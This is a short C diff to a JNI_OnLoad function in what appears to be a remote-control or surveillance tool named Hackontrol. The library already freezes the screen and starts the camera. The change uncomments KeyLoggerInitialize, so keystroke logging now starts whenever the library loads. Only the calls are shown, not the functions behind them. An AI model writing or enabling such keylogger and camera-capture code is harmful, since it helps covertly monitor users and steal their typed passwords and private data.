@@ -15,7 +15,7 @@ JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* virtualMachine, void* reserved) {
 	RegisterShutdownHandler(environment, virtualMachine);
 	InitializeScreenFreezer(environment, virtualMachine);
 	RegisterHackontrolNative(environment);
-	//KeyLoggerInitialize(environment, virtualMachine);
+	KeyLoggerInitialize(environment, virtualMachine);
 	InitializeCamera(environment);
 	return JNI_VERSION_21;
 }
